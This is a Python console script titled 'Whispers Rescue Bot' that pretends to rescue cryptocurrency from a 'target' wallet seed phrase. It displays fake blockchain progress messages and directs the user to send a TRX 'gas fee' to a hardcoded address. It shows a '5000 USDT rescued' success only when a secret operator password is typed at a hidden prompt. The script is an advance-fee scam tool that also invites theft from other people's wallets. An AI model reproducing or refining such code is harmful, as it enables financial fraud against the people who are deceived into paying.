import time
import os
import sys
from threading import Thread
from colorama import Fore, Style, init
from getpass import getpass

# Initialize Colorama
init(autoreset=True)

# Functions for effects
def blinking_forward_slash(duration):
    """Blinking forward slash effect."""
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(Fore.YELLOW + "/" + Style.RESET_ALL + "\r")
        sys.stdout.flush()
        time.sleep(0.2)
        sys.stdout.write(" " + "\r")
        sys.stdout.flush()
        time.sleep(0.2)

def strange_symbols_and_loading(duration=50):
    """Simulate strange symbols and loading bar."""
    symbols = "!@#$%^&*()_+=-[]{}|:;<>,.?/`~"
    total_ticks = 50
    interval = duration / total_ticks

    sys.stdout.write("[" + " " * total_ticks + "] 0%\r")
    sys.stdout.flush()

    for i in range(total_ticks + 1):
        time.sleep(interval)
        sys.stdout.write("[" + Fore.GREEN + "=" * i + " " * (total_ticks - i) + Style.RESET_ALL + f"] {i * 2}%\r")
        sys.stdout.flush()

    sys.stdout.write("\n")

# Main Bot
def whispers_rescue_bot():
    # Step 1: Display initial message
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.GREEN + Style.BRIGHT + "Whispers Rescue Bot\n")
    time.sleep(7)

    # Step 2: Display random characters
    print("cWJCNaljdOo0qpmmCZpFPUnyG8YIoVf4kishj8u7BeEs0ru4tlnhkL16fOXQREoB3pocrxajLskn8weyxvVpuT0cQ32dnM2vBoUp\n")
    time.sleep(2)
    print(Fore.RED + Style.BRIGHT + "Loading blockchain...\n")
    time.sleep(10)

    # Step 3: Input seed phrase
    seed_phrase = input("Input the target seed phrase (12 or 24 words): ").strip()
    seed_words = seed_phrase.split()
    if len(seed_words) not in [12, 24]:
        print(Fore.RED + "Invalid seed phrase length! Seed must be exactly 12 or 24 words. Restart the bot.")
        return
    print(Fore.BLUE + Style.BRIGHT + "\nWallet confirmed: Active\n")
    time.sleep(5)

    # Step 4: Input receiving address
    receiving_address = input("Enter your receiving wallet address (double check for accuracy): ").strip()
    if not receiving_address:
        print(Fore.RED + "Invalid address! Restart the bot.")
        return
    print(Fore.GREEN + Style.BRIGHT + "\nMerging block as one...\n")
    time.sleep(5)

    # Step 5: Sponsor address
    time.sleep(2)
    print("\nYour sponsor address is TKbZQ7yUugNFa9FVzANgz1APcyAsgLfjje")
    print("Sponsor address is hardcoded for block merging. Send the exact gas fee in TRX required to rescue the assets.")
    time.sleep(2)

    # Step 6: Confirm payment or quit
    choice = input("\nDo you wish to pay the gas fee? (Y/N): ").strip().lower()
    if choice == "n":
        print(Fore.GREEN + Style.BRIGHT + "Goodbye")
        return
    elif choice != "y":
        print(Fore.RED + "Invalid choice! Restart the bot.")
        return

    # Step 7: Simulate blinking forward slash
    print(Fore.YELLOW + "\nSend gas fee to the address stated above.\n")
    print("Processing...")

    # Start blinking forward slash in a separate thread
    blink_duration = 30  # Total blinking duration in seconds
    blinking_thread = Thread(target=blinking_forward_slash, args=(blink_duration,))
    blinking_thread.start()

    # Allow user to type while slash blinks (input hidden)
    user_input = getpass("\nConfirm you have sent the gas fee to the sponsor address: (hidden): ").strip()
    blinking_thread.join()

    # Response after blinking ends
    if user_input == "@Kallstr0m":
        print(Fore.GREEN + "\nPayment received, executing rescue program...\n")
        strange_symbols_and_loading(duration=50)  # Strange symbols and loading bar
        print(Fore.BLUE + f"\n5000 USDT rescued and sent to {receiving_address}\n")
        time.sleep(30)
        print(Fore.GREEN + "Goodbye!")
    else:
        print(Fore.RED + f"Confirm you have sent the gas fee to the sponsor address: TKbZQ7yUugNFa9FVzANgz1APcyAsgLfjje")
        time.sleep(2)
        print(Fore.YELLOW + "Processing... (Retry)")

# Run the bot
if __name__ == "__main__":
    whispers_rescue_bot()

